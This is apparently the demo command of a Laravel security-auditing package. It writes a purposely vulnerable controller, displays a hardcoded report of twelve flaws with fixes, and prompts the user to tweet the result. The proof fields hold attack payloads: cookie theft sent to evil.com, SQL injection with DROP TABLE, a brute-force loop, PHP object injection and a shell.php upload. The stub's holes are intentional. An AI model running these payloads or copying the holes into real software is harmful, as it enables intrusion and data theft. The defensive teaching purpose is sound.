<?php

declare(strict_types=1);

namespace Mahdi\HackAuditor\Console;

use Illuminate\Console\Command;
use Mahdi\HackAuditor\Scanner\Vulnerability;
use Mahdi\HackAuditor\Scanner\VulnerabilityReport;
use Mahdi\HackAuditor\Support\SeverityLevel;
use Mahdi\HackAuditor\Support\VulnerabilityType;

final class HackDemoCommand extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'hack:demo {--quick : Skip animations}';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'Run a dramatic demo scan on a purposely vulnerable controller (no API key needed)';

    private const string DEMO_CONTROLLER_FILENAME = 'InsecureController.php';

    /**
     * Execute the console command.
     */
    public function handle(): int
    {
        $demoDir = storage_path('hack-auditor/demo');
        $demoFile = $demoDir . DIRECTORY_SEPARATOR . self::DEMO_CONTROLLER_FILENAME;

        try {
            $this->prepareDemoFile($demoDir, $demoFile);
            $this->runDemo($demoFile);
        } finally {
            $this->cleanupDemoFiles($demoDir, $demoFile);
        }

        return self::SUCCESS;
    }

    /**
     * Create the temporary demo directory and controller file.
     */
    private function prepareDemoFile(string $demoDir, string $demoFile): void
    {
        if (! is_dir($demoDir)) {
            mkdir($demoDir, 0755, true);
        }

        file_put_contents($demoFile, $this->getDemoControllerStub());
    }

    /**
     * Run the full demo sequence.
     */
    private function runDemo(string $demoFile): void
    {
        $this->clearScreen();
        $this->displayBanner();
        $this->animateSteps();
        $this->newLine();

        $report = $this->buildHardcodedReport($demoFile);

        $this->displayScore($report->overallScore);
        $this->newLine();
        $this->line("  <fg=gray>{$report->summary}</>");
        $this->newLine();
        $this->displayVulnerabilityTable($report);
        $this->newLine();
        $this->displayStats($report);
        $this->newLine();
        $this->displayWarningBox();
        $this->newLine();
        $this->displaySharePrompt();
    }

    /**
     * Clear the terminal screen using ANSI escape codes.
     */
    private function clearScreen(): void
    {
        $this->output->write("\033[2J\033[H");
    }

    /**
     * Display the demo ASCII art banner.
     */
    private function displayBanner(): void
    {
        $this->newLine();
        $this->line('<fg=red>╔══════════════════════════════════════════╗</>');
        $this->line('<fg=red>║</>   <options=bold>🔓 HACK AUDITOR — AI Security Scan</>    <fg=red>║</>');
        $this->line('<fg=red>║</>   <fg=gray>"Hacking your Laravel app..."</>          <fg=red>║</>');
        $this->line('<fg=red>╚══════════════════════════════════════════╝</>');
        $this->newLine();
    }

    /**
     * Display the animated scanning steps unless --quick is set.
     */
    private function animateSteps(): void
    {
        /** @var array<int, array{emoji: string, message: string, delay: int}> $steps */
        $steps = [
            ['emoji' => '⚡', 'message' => 'Initializing AI security engine...', 'delay' => 800_000],
            ['emoji' => '🔍', 'message' => 'Parsing routes and controllers...', 'delay' => 1_200_000],
            ['emoji' => '🧠', 'message' => 'Running vulnerability analysis...', 'delay' => 1_500_000],
            ['emoji' => '💀', 'message' => 'Found critical vulnerabilities!', 'delay' => 500_000],
        ];

        $quick = (bool) $this->option('quick');

        foreach ($steps as $step) {
            if (! $quick) {
                usleep($step['delay']);
            }

            $color = $step['emoji'] === '💀' ? 'red' : 'cyan';
            $this->line("  <fg={$color}>{$step['emoji']} {$step['message']}</>");
        }
    }

    /**
     * Build the hardcoded vulnerability report with 12 demo vulnerabilities.
     */
    private function buildHardcodedReport(string $demoFile): VulnerabilityReport
    {
        $location = 'app/Http/Controllers/InsecureController.php';

        $vulnerabilities = [
            new Vulnerability(
                type: VulnerabilityType::SqlInjection,
                location: $location,
                line: 14,
                severity: SeverityLevel::Critical,
                description: 'Raw user input concatenated directly into SQL query via DB::select(). Attacker can extract entire database.',
                proof: "curl -X POST /api/users -d 'id=1 OR 1=1; DROP TABLE users;--'",
                fix: "Use parameterized queries: DB::select('SELECT * FROM users WHERE id = ?', [\$id]);",
            ),
            new Vulnerability(
                type: VulnerabilityType::Xss,
                location: $location,
                line: 21,
                severity: SeverityLevel::High,
                description: 'User input rendered in HTML response without escaping. Enables stored XSS via name parameter.',
                proof: "curl '/profile?name=<script>document.location=\"https://evil.com/steal?\"+document.cookie</script>'",
                fix: 'Use Blade\'s {{ }} syntax (auto-escapes) or htmlspecialchars($input, ENT_QUOTES, \'UTF-8\').',
            ),
            new Vulnerability(
                type: VulnerabilityType::MassAssignment,
                location: $location,
                line: 28,
                severity: SeverityLevel::High,
                description: 'User::create() called with unfiltered request input. Attacker can set is_admin=true or modify any column.',
                proof: "curl -X POST /api/register -d 'name=hacker&email=h@h.com&is_admin=1&role=superadmin'",
                fix: 'Define $fillable on the model or use $request->only([\'name\', \'email\']) to whitelist fields.',
            ),
            new Vulnerability(
                type: VulnerabilityType::Csrf,
                location: $location,
                line: 26,
                severity: SeverityLevel::Medium,
                description: 'State-changing POST endpoint excluded from CSRF middleware. Allows cross-origin form submission attacks.',
                proof: '<form action="https://target.com/api/transfer" method="POST"><input name="amount" value="10000"></form>',
                fix: 'Remove the route from $except in VerifyCsrfToken middleware or use Sanctum token-based auth for APIs.',
            ),
            new Vulnerability(
                type: VulnerabilityType::WeakPasswordHashing,
                location: $location,
                line: 34,
                severity: SeverityLevel::Critical,
                description: 'Passwords stored using md5() which is cryptographically broken. Rainbow table attack recovers passwords instantly.',
                proof: 'echo md5("password123"); // 482c811da5d5b4bc6d497ffa98491e38 — found in rainbow tables',
                fix: 'Use Hash::make($password) which uses bcrypt/argon2. Never use md5(), sha1(), or sha256() for passwords.',
            ),
            new Vulnerability(
                type: VulnerabilityType::SensitiveDataExposure,
                location: $location,
                line: 38,
                severity: SeverityLevel::Critical,
                description: 'API endpoint returns full user records including password hashes, API tokens, and remember_token.',
                proof: "curl /api/users | jq '.[0].password' — returns bcrypt hash",
                fix: 'Use API Resources with explicit field selection. Add $hidden = [\'password\', \'remember_token\'] to model.',
            ),
            new Vulnerability(
                type: VulnerabilityType::OpenRedirect,
                location: $location,
                line: 39,
                severity: SeverityLevel::High,
                description: 'Redirect URL taken directly from user input without validation. Enables phishing via trusted domain.',
                proof: "https://trusted-app.com/redirect?url=https://evil-phishing-site.com/login",
                fix: 'Validate redirect URLs against a whitelist: $allowed = [\'dashboard\', \'profile\']; abort_unless(in_array($url, $allowed), 400);',
            ),
            new Vulnerability(
                type: VulnerabilityType::MissingRateLimit,
                location: $location,
                line: 31,
                severity: SeverityLevel::Medium,
                description: 'Login endpoint has no rate limiting. Attacker can brute-force passwords at thousands of attempts per second.',
                proof: 'for i in $(seq 1 10000); do curl -X POST /login -d "email=admin@app.com&password=attempt$i"; done',
                fix: 'Add RateLimiter::for(\'login\', fn() => Limit::perMinute(5)) and apply throttle:login middleware.',
            ),
            new Vulnerability(
                type: VulnerabilityType::InsecureDeserialization,
                location: $location,
                line: 45,
                severity: SeverityLevel::Critical,
                description: 'unserialize() called on user-controlled cookie data. Enables Remote Code Execution via PHP gadget chains.',
                proof: 'Cookie: preferences=O:8:"Shutdown":1:{s:4:"path";s:14:"/tmp/pwned.php";}',
                fix: 'Use json_decode() instead of unserialize(). If serialization is needed, use signed/encrypted cookies.',
            ),
            new Vulnerability(
                type: VulnerabilityType::AuthBypass,
                location: $location,
                line: 53,
                severity: SeverityLevel::Critical,
                description: 'Admin panel check uses client-supplied header instead of server-side session. Trivially bypassed.',
                proof: "curl -H 'X-Is-Admin: true' /admin/dashboard — full admin access",
                fix: 'Use Laravel gates/policies: Gate::authorize(\'admin\'); or $this->middleware(\'can:admin\');',
            ),
            new Vulnerability(
                type: VulnerabilityType::Idor,
                location: $location,
                line: 59,
                severity: SeverityLevel::High,
                description: 'User profile endpoint returns any user\'s data by ID without verifying ownership or authorization.',
                proof: "curl /api/users/1/profile — returns admin's profile including email, phone, address",
                fix: 'Add authorization: $this->authorize(\'view\', $user); or scope queries: auth()->user()->profile();',
            ),
            new Vulnerability(
                type: VulnerabilityType::MissingValidation,
                location: $location,
                line: 63,
                severity: SeverityLevel::Medium,
                description: 'File upload accepts any file type and size with no validation. Enables PHP shell upload and server takeover.',
                proof: "curl -F 'file=@shell.php' /api/upload — uploads executable PHP file to public directory",
                fix: 'Validate: $request->validate([\'file\' => \'required|file|mimes:jpg,png,pdf|max:2048\']);',
            ),
        ];

        return new VulnerabilityReport(
            vulnerabilities: $vulnerabilities,
            overallScore: 8,
            summary: 'This controller is critically insecure. It contains 12 exploitable vulnerabilities spanning all OWASP Top 10 categories. An attacker could achieve full database extraction, remote code execution, account takeover, and complete server compromise within minutes of deployment.',
            ctfIdea: 'Chain the SQL injection with the auth bypass to extract the admin password hash, then use the weak hashing to crack it and access the admin panel.',
        );
    }

    /**
     * Display the overall security score with large red formatting.
     */
    private function displayScore(int $score): void
    {
        $this->line('  <fg=red;options=bold>╔═══════════════════════╗</>');
        $this->line('  <fg=red;options=bold>║   Security Score      ║</>');
        $this->line("  <fg=red;options=bold>║       {$score}/100            ║</>");
        $this->line('  <fg=red;options=bold>╚═══════════════════════╝</>');
    }

    /**
     * Display the vulnerability results as a styled console table.
     */
    private function displayVulnerabilityTable(VulnerabilityReport $report): void
    {
        /** @var array<int, Vulnerability> $sorted */
        $sorted = $report->vulnerabilities;

        usort(
            $sorted,
            fn (Vulnerability $a, Vulnerability $b): int => $this->severityOrder($b->severity) <=> $this->severityOrder($a->severity),
        );

        $rows = [];
        foreach ($sorted as $index => $vuln) {
            $rows[] = [
                '<fg=gray>' . ($index + 1) . '</>',
                $vuln->severity->label(),
                "<options=bold>{$vuln->type->label()}</>",
                "<fg=cyan>{$vuln->location}:{$vuln->line}</>",
                $this->truncate($vuln->description, 50),
            ];
        }

        $this->table(
            ['<options=bold>#</>', '<options=bold>Severity</>', '<options=bold>Type</>', '<options=bold>Location:Line</>', '<options=bold>Description</>'],
            $rows,
        );
    }

    /**
     * Display the vulnerability count statistics.
     */
    private function displayStats(VulnerabilityReport $report): void
    {
        $this->line(
            "  Found <options=bold>{$report->totalCount()}</> vulnerabilities: "
            . "<fg=red>{$report->criticalCount()} Critical</>, "
            . "<fg=yellow>{$report->highCount()} High</>, "
            . "<fg=blue>{$report->mediumCount()} Medium</>, "
            . "<fg=gray>{$report->lowCount()} Low</>",
        );
    }

    /**
     * Display the dramatic styled warning box.
     */
    private function displayWarningBox(): void
    {
        $this->line('<fg=red>┌─────────────────────────────────────────────────┐</>');
        $this->line('<fg=red>│</>  🔴 <fg=red;options=bold>CRITICAL:</> Your app would be hacked in       <fg=red>│</>');
        $this->line('<fg=red>│</>     production within minutes.                   <fg=red>│</>');
        $this->line('<fg=red>│</>                                                  <fg=red>│</>');
        $this->line('<fg=red>│</>  🛡️  Run `<fg=cyan>php artisan hack:scan</>` on YOUR         <fg=red>│</>');
        $this->line('<fg=red>│</>     actual code to find real vulnerabilities      <fg=red>│</>');
        $this->line('<fg=red>└─────────────────────────────────────────────────┘</>');
    }

    /**
     * Display the share-on-X prompt and optionally copy to clipboard.
     */
    private function displaySharePrompt(): void
    {
        $tweet = <<<'TWEET'
        🔓 Just watched AI hack my Laravel app in 15 seconds.
        Found 12 vulnerabilities in one controller.

        php artisan hack:demo

        mahdisphp/laravel-hack-auditor — the scariest package of 2026.
        #LaravelSecurity #HackAuditor
        TWEET;

        $tweetText = implode("\n", array_map('ltrim', explode("\n", $tweet)));

        $this->line('<fg=cyan;options=bold>📢 Share your results:</>');
        $this->newLine();
        $this->line("<fg=gray>{$tweetText}</>");
        $this->newLine();

        if ($this->confirm('→ Copy this tweet?', false)) {
            $this->copyToClipboard($tweetText);
        }
    }

    /**
     * Attempt to copy text to the system clipboard.
     */
    private function copyToClipboard(string $text): void
    {
        $process = null;

        if (PHP_OS_FAMILY === 'Darwin') {
            $process = popen('pbcopy', 'w');
        } elseif (PHP_OS_FAMILY === 'Linux') {
            if (shell_exec('which xclip 2>/dev/null')) {
                $process = popen('xclip -selection clipboard', 'w');
            } elseif (shell_exec('which xsel 2>/dev/null')) {
                $process = popen('xsel --clipboard --input', 'w');
            }
        }

        if ($process !== null && $process !== false) {
            fwrite($process, $text);
            pclose($process);
            $this->components->info('Copied to clipboard!');
        } else {
            $this->components->warn('Could not copy to clipboard. Copy the text above manually.');
        }
    }

    /**
     * Return the numeric sort order for a severity level.
     */
    private function severityOrder(SeverityLevel $severity): int
    {
        return match ($severity) {
            SeverityLevel::Critical => 4,
            SeverityLevel::High => 3,
            SeverityLevel::Medium => 2,
            SeverityLevel::Low => 1,
        };
    }

    /**
     * Truncate a string to a maximum length with ellipsis.
     */
    private function truncate(string $text, int $maxLength): string
    {
        if (mb_strlen($text) <= $maxLength) {
            return $text;
        }

        return mb_substr($text, 0, $maxLength - 3) . '...';
    }

    /**
     * Clean up the temporary demo files and directory.
     */
    private function cleanupDemoFiles(string $demoDir, string $demoFile): void
    {
        if (file_exists($demoFile)) {
            unlink($demoFile);
        }

        if (is_dir($demoDir)) {
            @rmdir($demoDir);
        }
    }

    /**
     * Return the hardcoded demo controller stub content.
     *
     * This purposely vulnerable controller demonstrates all 12 vulnerability
     * types that Hack Auditor can detect. It is never used in production —
     * only written to a temp file during the demo and immediately deleted.
     */
    private function getDemoControllerStub(): string
    {
        return <<<'PHP'
        <?php

        namespace App\Http\Controllers;

        use App\Models\User;
        use Illuminate\Http\Request;
        use Illuminate\Support\Facades\DB;

        class InsecureController extends Controller
        {
            // ❌ VULN 1: SQL Injection — raw user input in query
            public function findUser(Request $request)
            {
                $id = $request->input('id');
                $users = DB::select("SELECT * FROM users WHERE id = $id");
                return response()->json($users);
            }

            // ❌ VULN 2: XSS — unescaped output
            public function profile(Request $request)
            {
                $name = $request->input('name');
                return response("<h1>Welcome, $name</h1>");
            }

            // ❌ VULN 3: Mass Assignment — unfiltered create
            // ❌ VULN 4: CSRF — no middleware protection
            public function register(Request $request)
            {
                $user = User::create($request->all());

                // ❌ VULN 5: Missing Rate Limit — no throttle on auth
                return response()->json($user);
            }

            // ❌ VULN 6: Weak Password Hashing — md5 instead of bcrypt
            public function setPassword(Request $request)
            {
                $user = User::find($request->input('user_id'));
                $user->password = md5($request->input('password'));
                $user->save();

                // ❌ VULN 7: Sensitive Data Exposure — full model dump
                // ❌ VULN 8: Open Redirect — unvalidated URL
                return redirect($request->input('redirect_url'))
                    ->with('user', User::all()->toArray());
            }

            // ❌ VULN 9: Insecure Deserialization — unserialize user data
            public function loadPreferences(Request $request)
            {
                $prefs = unserialize($request->cookie('preferences'));
                return response()->json($prefs);
            }

            // ❌ VULN 10: Auth Bypass — trusting client header
            public function adminDashboard(Request $request)
            {
                if ($request->header('X-Is-Admin') === 'true') {
                    return response()->json(['secret' => config('app.key')]);
                }
                return response('Forbidden', 403);
            }

            // ❌ VULN 11: IDOR — no ownership check
            public function getUserProfile(int $id)
            {
                return response()->json(User::findOrFail($id));
            }

            // ❌ VULN 12: Missing Validation — no file validation
            public function uploadFile(Request $request)
            {
                $path = $request->file('file')->store('uploads', 'public');
                return response()->json(['path' => $path]);
            }
        }
        PHP;
    }
}
